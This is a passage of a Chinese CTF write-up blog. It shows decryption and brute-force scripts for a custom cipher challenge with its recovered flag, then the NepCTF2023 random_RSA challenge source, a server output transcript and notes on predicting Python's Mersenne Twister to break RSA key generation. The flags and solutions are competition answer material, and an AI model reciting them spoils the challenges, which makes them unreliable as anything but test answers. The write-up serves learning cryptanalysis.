class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string3[util1(map_string1, j)]</span><br><span class="line"></span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_phase3</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string3[util1(map_string2, j)]</span><br><span class="line"></span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br></pre></td></tr></table></figure><p>通过判断条件<code>flaglist1_re0 == flaglist1_re1</code>，我们可以确定cipher中哪一部分属于<code>crypto_phase3(crypto_phase2(flaglist1))</code>，哪一部分属于crypto_phase3( flaglist1)，哪一部分属于<code>crypto_phase2(crypto_phase3(flaglist2))</code></p><p>完整脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">util1</span>(<span class="params">map_string: <span class="built_in">str</span>, c</span>):</span><br><span class="line">    <span class="keyword">return</span> map_string.index(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_phase2</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string3[util1(map_string1, j)]</span><br><span class="line"></span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_phase3</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string3[util1(map_string2, j)]</span><br><span class="line"></span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;&#x27;&amp;I1&#125;ty~A:bR&gt;)Q/;6:*6`1;bum?8i[LL*t`1;bum?8i[LL?Ia`1;bum?8i[LL72;xl:mvHF&quot;z4_/DD+c:mvHF&quot;z4_/DDzbZ:mvHF&quot;z4_/DDr&#125;vS?&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flaglist2_re = decrypt_phase3(decrypt_phase2(cipher[<span class="number">0</span>:i]))</span><br><span class="line">        flaglist1_re0 = decrypt_phase2(decrypt_phase3(cipher[j:]))</span><br><span class="line">        flaglist1_re1 = decrypt_phase3(cipher[i:j])</span><br><span class="line">        <span class="keyword">if</span>(flaglist1_re0 == flaglist1_re1):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;i = <span class="subst">&#123;i&#125;</span> j = <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># i = 20 j = 66</span></span><br><span class="line">flaglist2_re = <span class="string">&#x27;&#x27;</span>.join(flaglist2_re)</span><br><span class="line">flaglist1_re = <span class="string">&#x27;&#x27;</span>.join(flaglist1_re0)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flaglist2_re = <span class="subst">&#123;flaglist2_re&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flaglist1_re = <span class="subst">&#123;flaglist1_re&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="还原flag"><a href="#还原flag" class="headerlink" title="还原flag"></a>还原flag</h5><p>此时得到的<code>flaglist1_re</code> 和<code>flaglist2_re</code>如下：</p><img src="/posts/25f6527726f2/image-20230729165329835.png" class="" title="image-20230729165329835"><p>其实已经带有一定的语义了</p><p>接下来观察加密时的第一步，也就是<strong>crypto_phase1(）</strong>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crypto_phase1</span>(<span class="params">flag</span>):</span><br><span class="line">    flag_list1 = util(flag).split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    newlist1 = []</span><br><span class="line">    newlist2 = []</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag_list1:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            i1 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">                p, index = mess_sTr(i[j], index)</span><br><span class="line">                i1 += p</span><br><span class="line">           </span><br><span class="line">            p, index = mess_sTr(i[<span class="number">0</span>], index)</span><br><span class="line">            i1 += p</span><br><span class="line">            </span><br><span class="line">            i1 += <span class="built_in">str</span>(k)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            newlist1.append(i1)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="built_in">str</span>(k)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            newlist2.append(i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> newlist1, newlist2</span><br></pre></td></tr></table></figure><p>flag中的每个用<code>_</code>隔开的元素在进行转换时都会在末尾增加<strong>递增的标志k</strong></p><p>那么我们就可以利用k将flaglist1_re 和flaglist2_re进一步分割：</p><img src="/posts/25f6527726f2/image-20230729170223850.png" class="" title="image-20230729170223850"><p>flaglist2序列中的元素不需要变化，关键就在于将flaglist1中的元素根据题目的异或规则复原</p><p>鉴于flaglist1只有两个元素，且字符长度均为3，考虑直接正向爆破，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_phase1</span>(<span class="params">flag_list1,index</span>):</span><br><span class="line"></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    i1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        p, index = mess_sTr(i[j], index)</span><br><span class="line">        i1 += p</span><br><span class="line"></span><br><span class="line">    p, index = mess_sTr(i[<span class="number">0</span>], index)</span><br><span class="line">    i1 += p</span><br><span class="line">    <span class="keyword">return</span> i1,index</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">alphabet = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(alphabet, repeat=<span class="number">3</span>):</span><br><span class="line">    i = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    _,index = decrypt_phase1(i,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(_==<span class="string">&#x27;CrashOnYou??TDa&gt;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(alphabet, repeat=<span class="number">3</span>):</span><br><span class="line">    i = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    _,index1 = decrypt_phase1(i,index)</span><br><span class="line">    <span class="keyword">if</span>(_==<span class="string">&#x27;CrashOnYou??FRCrashOnYou??nw&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆破结果如下</p><img src="/posts/25f6527726f2/image-20230729173707528.png" class="" title="image-20230729173707528"><p>遂最终flag为 <code>sixstars&#123;TrY_F1nD_s0m3_F4n_ln_cR7PtO&#125;</code></p><h2 id="NepCTF2023"><a href="#NepCTF2023" class="headerlink" title="NepCTF2023"></a>NepCTF2023</h2><h3 id="random-RSA"><a href="#random-RSA" class="headerlink" title="random_RSA"></a>random_RSA</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSA_random.py</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, invert <span class="keyword">as</span> inverse_mod</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> lcm</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">global_bits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">rb&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.--------.--------.--------.--------.--------.--------.--------.--------.--------.--------.--------.</span></span><br><span class="line"><span class="string">| N.--.  | E.--.  | P.--.  | C.--.  | T.--.  | F.--.  | H.--.  | A.--.  | P.--.  | P.--.  | Y.--.  |</span></span><br><span class="line"><span class="string">|  :/\:  |  (\/)  |  :():  |  :/\:  |  :/\:  |  :/\:  |  (\/)  |  :():  |  :/\:  |  :/\:  |  (\/)  |</span></span><br><span class="line"><span class="string">|  :\/:  |  :\/:  |  ()()  |  (__)  |  :\/:  |  (__)  |  :\/:  |  ()()  |  :\/:  |  :\/:  |  :\/:  |</span></span><br><span class="line"><span class="string">|  &#x27;--&#x27;n |  &#x27;--&#x27;e |  &#x27;--&#x27;p |  &#x27;--&#x27;c | &#x27;--&#x27;t  |  &#x27;--&#x27;f |  &#x27;--&#x27;h |  &#x27;--&#x27;a |  &#x27;--&#x27;p |  &#x27;--&#x27;p |  &#x27;--&#x27;y |</span></span><br><span class="line"><span class="string">`--------`--------`--------`--------&#x27;--------`--------`--------`--------`--------`--------`--------`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_prime</span>(<span class="params">bits: <span class="built_in">int</span></span>):</span><br><span class="line">    p = (getrandbits(bits - <span class="number">32</span>) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> next_prime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_private_key</span>(<span class="params">bits: <span class="built_in">int</span></span>):</span><br><span class="line">    p, q = generate_prime(bits), generate_prime(bits)</span><br><span class="line">    n, phi = p * q, lcm(p-<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    d = inverse_mod(<span class="number">0x10001</span>, phi)</span><br><span class="line">    privateKey = RSA.construct((<span class="built_in">int</span>(n), <span class="built_in">int</span>(<span class="number">0x10001</span>), <span class="built_in">int</span>(d), <span class="built_in">int</span>(p), <span class="built_in">int</span>(q)))</span><br><span class="line">    <span class="keyword">return</span> privateKey, p &gt; q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(BANNER.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the world of random RSA.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please make your choice.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        choice = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            p, q = generate_prime(global_bits), generate_prime(global_bits)</span><br><span class="line">            N = p*q</span><br><span class="line">            d = generate_prime(global_bits-<span class="number">32</span>)</span><br><span class="line">            e = inverse_mod(d, (p * p - <span class="number">1</span>) * (q * q - <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(N)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            privateKey, signal = generate_private_key(global_bits)</span><br><span class="line">            Cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">            c = (Cipher.encrypt(flag.encode()))</span><br><span class="line">            <span class="built_in">print</span>(c)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">22537824826661390223424247613988068034762851961157584494237475399272684698931837582845353300058708376928066803405952833371270343886811582482596041025703562011290683776244440183058564931536167588068982985446423691731289919792182527017708444670021961040693402133847603155628894661303844045174158892135246551752887296981551783741194429738125411950353273196689940793799918342870149922450137468917079363770653597792198995114960248957648399949770607031773274269305508205502788420176566800613727078909046810965678172896900712370390242747304193464562017569375391573425033201518897326268974895428864607294404834217486889626067</span><br><span class="line">138734597932681432146593418071500104975097303947235094754561455609462297555431740773778233199030836536181432380163420879026102996000812679067503821183989703625007081183136453867034603133623214624347743902763056646758303457573028872281836337816161325620419859404564303343891497751416698105376363608315824345809065611898005422541630568343931058614508204741013188215685621271052482911000416811907896612076443855215829082314173006789532402139226514279369930916581792561410304609979179181212657266021728705826301323934157434591614855280547917537852436113654407688546561597461431646587315004899280385693864467900922100139871785655120697706496224116446681145092889309317515443325835174244973690025382177377962932105743284683009382320913496757661606711346067741870427773815722572964498484063351551391418412838281736894948235137587183065029215731250865241317657697517413333042995868451419526992362575295353213512321908674676945279408691460555734014052988319778462382048778709139419333524385417952528530366999004891284914825847790181862255603834009637969575260079574396804250215455740325558291131627689579437078295278863294097845252667171535763807924168498127261282731290505289608262179438124625649642636182083776300283319289915374624961712653</span><br><span class="line">1</span><br><span class="line">6274546339544888768644789843311419134818004096768603845365518977306935493052521497519175028089437236761423867823262516191490597273908631998081154618285312153434770073720976098867396742471680890293254752267605499255169326711848016278766753778762031405366921683792056789407853305249437106982348618425021256460636482851698435376389919364204769613192430479123706318293585495289879180851132554973818815070788262098611224093020341849237428117879027244911203346180853298544223713486928469372908721392827684780137693677209345445942919962990053250395024484583187421075440641480216037229722393785452525034345237210128057575471</span><br><span class="line">6816229639274112360127375160129976283803780671835649464662216953274788670298119581490308251091527765523862793876248484976964516014521928193402406674543559617331132672377525907986916620128585686125738095495763839466668090496434574665174465481239266885391258338614183207608126631709820109879956875736614878909323605565935381337508623639537061259891127144542904865315473351573299736626413254743748115425609364728057333519641010517774252868076778182331567470953952498350730833750070954728558468762716771017777706375771619651064685534393033318515482257223763229174514686211337316905863509879412175617527218834684703000403031425463770536830127898992834855679772246235520604090201191704944952028218549992251035280635917847240965148800849625354939856660848785382830964868230182487528332536748623696072982084155943005225059557342296182817587500114794828507381124146190353878908176849950890467106544577637908359501063238750187093982399537914521258266082734645849446560162705750663487079882805604564517075915685197992097212331440571415385599231910976013688951015114926830356741094239761437270621663346419901696795850688564776378820503827041193837318548510119014302810053953658676697019697630188625116410092169127152796058863748764013682497939</span><br><span class="line">1</span><br><span class="line">7033242934313911617915370463753973061696207288498842695764035487588917876242440540290488008869797904974691714697721721283947971355999106035289016138345801910133073068174108170229491675603212395933924016278358008639554322624843932897396960609189051209643497519694057494944289167537022332119761934070861532451907286657700650146806555444747940730420147901212379535719653643484173080079172941837018636441478229515012901998513559519866730685829684707622706175764190994709063196495343830929136973633289340950272653728043308354240012161431695518275611578691206149580893537585370503416436231040785800664617370845457636507373</span><br><span class="line">40741835840719057027068319492970583470528881382803716418364653870080058622156909377738185420827467314413512511492397920252164414117956834276649844216914404018920028811630177722875369807281893530197017252963630372370374747148813182542589995731838473868063073754954223509497830267809800926245205430476741139619912913673282788675304357813092521700071091744825240512494990728254527083377716674388696819784313808339878265621192173538020777314766219688491638667567106959131093575346705953518495833259604515597325271001238649465380577080494672991745328792235370276741154715574780192691254866861858895341850694654596225740569111073008359702667896467205706781036648628893475072715410255037942273267206315235983153223008531618610230257086119285886173157484398906439752068495678556357613795791467066810705197121410350568328793810636815141728035779662700816654743489502219781077759760073393120940600454699774737362141583979261402813400146968416902616192346695791038404476286201688240239025132255687828236074960774939024752010058639702283427958154036115595796747847178223186808400212601781457541710579621507634949928138998458710132991536600694493869256759751952918863741648153998280321586670085877464297833501428147851192475762142481144210374729</span><br><span class="line">1</span><br><span class="line">5515220884021336970862275167937432706774086760307345493758355407082611881687417106041988561159707722043326906871782788179830793948626803415269881180057295971488161156406028310765335645191428913247696931231456149936758576038023948926465001362260538823507280619462580966749698141504616966770774464155308261944306936232188699464903857962214868960712031476255910121174209368035150601980593184875627393772346196517700195653925532105502535054739699193987090827673963909885997488402164076254118140966268626515017282801146838949997254682432624148069106412023256666757294808355473524248706584183253743746190667825344090735507</span><br><span class="line">27545943436008205192466392146312275350052102340430590890066877373758488661449966774264552635128283215901820155231852994114772623236202481567239435535874760075504493562802626826291928384929323141604652686825513232209696424056756056541825020640169349125845012860406119215734155235823894038092632924099305318778218652782677929386981577810863948946016157839892403075950672327144434254914185650678383059840146557984115295339556244196605497494527019904188910500861412232834797080022272944616867030441521591763706703002065878450561713457527825688019967574810777811525255417243854717475915696113904995939128551197394619709767245589535610868051403872023084015959957890496719349590202804330300807904240587346054105871805966443483086940518302471177065206963143195767481445443418680777155432537987693729107638243548705745742678482316001891443966000174798210175352044800967369982858441628494534591240045812587764064373766987145633774419795741123588607411147213782886833718361722110440999096835034976152742315282032748045708702842770686418432412624392434147272156772744489786263382751791372640135423212833649821848146145001585638446209712930087341278823672429673683111970980096308606491748867960268649616693094935181469752524997580584805349947123</span><br><span class="line">1</span><br><span class="line">707553297879923177356335146532069623604428585457029141654099064083758325344279627925920242519099318326658381470467974653239791175600875958131324367593537709893757926812352231940885134981358322400240925105397807784118834519851991635527957423795609390852936897290132734999038988026169418881785178960809515864390576812740883128033281324731111796202403861022853438825679072942969660472810765800934597235296834952521633103134547244231864541397925943463303930419782291345864716578886463639342118925306182423459228179791865664561840052927559355777744624399481245874427367436123249916802781395498558815808117816153851090809</span><br><span class="line">476835325934189547836292777026041023371148571156463962012880958757944085399758738205283286399334722871894505046090766077229508600863632592015531531628092534860787027986660362296593590421952597122675521182585430259524898100255109700079833179961062981203497736752842526581854959840861895967740417318894425795071380577844789103318524725820756481753291260159826108893063109122213128545709370987322299362649554540926858127317326803313301356181179057881338863137280346277075415080842612942892560322933543217284701560108922901787612676458288276321967842403370403729030083964189266042501688426026969035742389856235451962236823285702151842172397039927227613155422065105587425258233562606059105631111048246890263847875100561204728076387995554893554018520146391083332662983471855734865236713621339367638774664903571940938222768477809946896904342352640218457067049228700063560561986208213880901466761766658005909132289894836214335025796250817129190015222343382401433477141447507445689525537850173095088031348312523535651644177815593848154982006431125144136434640061160594700287452918506662927231440240394313973842561113424179351101333205521687471664502208193453348226748463761211023487451484937024753345544403740598530714590979500824361898349</span><br><span class="line">1</span><br><span class="line">1174140632671015958261680882885689282089461375073396795698409666883472485597284663141211586467308831657514141409046557743901220588742234762871975650828276609892436013463956505148941718047758019452108677333838067737690070001391918566731891662155223281759699605140519220454976428865373529394744215204895977525725731538112915575334028817210061259374241384161149774887685139129929524748236393300647250180543352420479715186567359381371734233117769316250064423204561965836088727262981245272806674341083098416951592697842269090172337779893183460941187775737310053977539420950749247856094432739662593564239070582498797381009</span><br><span class="line">825353942467438234491111084516936797128140027203784474891798800414336605361414186661583004143257383201569203822551344974068949165344273763876615373043877527773093928960467215872693727816191117465919988153853161000881030542114914941352759498799545196523052122861955253519302407772691186951213308450636061291872775729603561683435521768308933690835080550772642833337817896300004822744605680361933350735805267937934286244922586652389425557655335013436726671473028595770338968627940302482280711760107774414537585937863168754668453885061204249986101071167028988095045568258441130714118233523745169679090945421590869375509998154504396878014511907888539167694131925238588859598725184662191826531994202286022429433690565056627911001834268776824700846906219148406027748395811448518747553045711021410331182717382379956168706606051002858514214330540368543514307421082375954175404302844792700585694756351868096269476974857475405543355119725892926139966042877395445749171112669690253373756673197045102745144246028153147601058742572746575386811945290093484519058179624368946654749995012889984471094647410670938250873437031330589096177392536521956944850884417890645930238421186410678500251283295562754926225650213865444544000297930194777658433889</span><br><span class="line">1</span><br><span class="line">6276624371571322127032717528988403355942748255487183219267886395660971429723684209001382203088006753614931749563754635436959672532470203173873966609604425233662748651974072780833472364097044853853352453104215290154805673093406690509685785395377452785503947795433224239515836453030100902644138118585267917947442229874047104299588820831133871052908583498858437224506062430779962591008533689175035855935205810375775549031261102987287032561315490868731527768409029395091316808354032134723564697369468445597956717874050607045073658705017638915547090694446609245551301975852518033673640951339784531542368356313947923717367</span><br><span class="line">4834448583556238562695333814669633473578395694994823308285848875447286856609545266763235079125953453630747057984939339519480845072027717047444425002584145597569095137335784562707662997300157488660880747910032450465764286421150106071387112517350098642033395129426783691267842349041299351180374740785056277266915618733246024742289334731264695226009208450387864801281044160267289921056725461400497169893204466841683255565774720703277610021920414649471524369642392114034753099895659454683133776017380599332734563716104395584378176004067527173821613141103789428693603220181387443973578566586053743228232089818664884161874519177760253682885066533216475221265861892995346645326152399587288537613784309794325645046905177498808889470249663668654810130597749775576909495987678548653910285369470549673317992925013277276466958694013901591757010380010612703667696761086495736918715214768477207011152740334849526812828915367533869104564994266525693597782393511548424817920580128787463341705437149065550280692381207426443987434943692728197680277851234773705473049444481734019328425281093760302507469963769149697884104863580140750939967048592895251133501980796441364382320329398348046615652832468150610453087912158467236578469248525561624767339227</span><br><span class="line">2</span><br><span class="line">b&quot;\t\xb9d\x82@\xe1-\xaa\xff\x86\t\xb2\x0e\xe51\x1ek\xa0\xb5&#x27;\xc2:\x95\x9c\xfb\x9f\xf0I\x1f\x05&amp;\xf6\xfa\x99A\x1c\x00\xea\xcd\xa25\xb9=\xe4\x87L\\Q\x0f\xad#\xf3\x9fC\x93\xa3\x01\xc4\xc8\xc4\xf3\x88RM\x92\x95\x99\xa5\xf5e\x1dDs2\x8c\x8d\xc3\xb5#\xd9\x01Z\xa6\x92\x10\xb8g\x8a\n\xea\xf6\xd4\xfan\xba\xedZiLU.-D\x18\x9dif\xea1\x9dz8Z\x1e\x9a\x0c\xd8$S\xa3\xf2\xa7\xa3\x1b\xf9\xb9\x96\xfd\t&#125;\xd4Su8\xb5+\xde\xb7\xd3\xa4\xbaa_\x0f\xccj\x86\x8d\x91\x9aJ!Z|\xcf\xa9\xae\xb9\xfe\x15\xd8\x04\xa7:\x86\xe6\x1e\xdc\x88\xbd\x1a3\x99\xc3N~\x08\x04\x18(\x8dG\xa8\x86\xd3\x03\xceF4\xb2Xp\x17:-\x1a\x1f;.\xefd\xbf7p\xe1\xca\x8a\x97\xfa\xcf\x1es\x0f\x0fJ\x87\x16\x91\xd1l\x13\xcb&lt;\xe9\x8c\x8ai\x80\xec\xe8\xeb\x87\xee\xb0\xabR\xdc\xa8D\x7f+\xa9|,\xa5\xce\xce-\xec\x86]i\xa8\x82\x8b)&quot;</span><br></pre></td></tr></table></figure><h4 id="比赛时的心路历程"><a href="#比赛时的心路历程" class="headerlink" title="比赛时的心路历程"></a>比赛时的心路历程</h4><div class="note flat"><p>random库中的getrandbits()方法用于返回一个指定大小（以位为单位）的整数。</p><p>该方法使用的伪随机数生成算法是<strong>梅森算法</strong></p><p>此处用到randcrack库中的predict_getrandbits()方法，当给出的随机数够多时，可以预测下一个随机数</p><p>具体使用RandCrack.submit()提交，最后用RandCrack.predict_getrandbits()预测</p><p>正好这一题循环了8次，那么前七次的数据可以用于预测第8次生成的随机数</p><p>具体要解决的是如何用每次的N、e算出p、q、d</p><p>可以试一下拓展维纳攻击，不过这个题的e和d定义比较奇怪</p></div><h4 id="复现write-up"><a href="#复现write-up" class="headerlink" title="复现write up"></a>复现write 